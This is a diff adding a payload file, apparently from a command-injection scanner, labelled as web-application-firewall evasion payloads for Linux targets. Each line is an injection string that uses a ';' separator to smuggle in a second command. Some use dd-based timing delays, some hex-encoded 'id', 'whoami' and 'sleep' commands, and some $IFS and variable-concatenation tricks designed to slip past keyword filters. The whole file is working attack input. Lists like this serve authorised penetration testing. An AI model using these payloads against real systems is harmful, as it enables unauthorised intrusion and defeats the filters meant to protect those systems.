@@ -1,0 +1,42 @@
+# @default_os:     linux
+# @default_signal: time
+# @default_blind:  true
+# @default_tier:   5
+#
+# WAF evasion payloads.
+# Triggered when waf/waf_block filter detected.
+# Primarily timing-based (non-keyword). dd bypass avoids sleep/ping.
+
+# @label: dd tab delay 50MB
+# @blind: true
+# @signal: time
+;dd	if=/dev/zero	bs=1M	count=50
+
+# @label: dd IFS delay 50MB
+# @blind: true
+# @signal: time
+;dd${IFS}if=/dev/zero${IFS}bs=1M${IFS}count=50
+
+# @label: ANSI-C hex id
+# @signal: system:linux_id
+# @blind: false
+;$'\x69\x64'
+
+# @label: ANSI-C hex whoami
+# @signal: system:linux_user
+# @blind: false
+;$'\x77\x68\x6f\x61\x6d\x69'
+
+# @label: ANSI-C hex sleep 10
+# @signal: time
+# @blind: true
+;$'\x73\x6c\x65\x65\x70'${IFS}10
+
+# @label: Var concat id bypass
+# @signal: system:linux_id
+# @blind: false
+;i$()d
+
+# @label: Env var execution
+# @signal: system:linux_id
+;a=id;$a
